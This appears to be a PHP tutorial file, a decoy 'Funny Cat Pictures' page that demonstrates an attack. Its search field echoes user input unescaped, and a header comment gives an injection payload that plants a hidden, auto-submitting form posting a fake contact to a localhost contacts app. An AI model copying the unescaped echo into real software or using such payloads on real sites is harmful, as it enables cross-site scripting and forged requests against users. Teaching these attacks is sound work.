<?php
/**
 * CSRF attacking page
 *
 * Run, for example, with:
 *

" /></form><form style="display: none" method="post" action="http://localhost/PHP101-Examples/006/contacts-app/add.php" id="evilform" target="targetframe">
    <input type="hidden" name="name" value="Dr. Evil" />
    <input type="hidden" name="email" value="drevil@evilco.com" />
    <input type="hidden" name="phone" value="12345678" />
</form>
<script type="text/javascript">
window.onload = function() {
    window.setTimeout(function() { document.getElementById('evilform').submit(); }, 1000);
};
</script>

 */
?>
<!DOCTYPE html>
<html>
    <head>
        <title>This is a funny site</title>
    </head>
    <body>
        <h1>The Funny Cat Pictures Website</h1>
        <div>
            <h2>Funny Cat Picture of the Day</h2>
            <img src="http://www.greatfunnypictures.com/pictures/227_funny_cat_pictures_05.jpeg" />
        </div>
        <form>
            <label>Search for more funny pictures:</label>
            <input type="text" name="q" value="<?php echo (isset($_GET['q']) ? $_GET['q'] : ''); ?>" />
            <input type="submit" value="Search" />
        </form>
    </body>
</html>
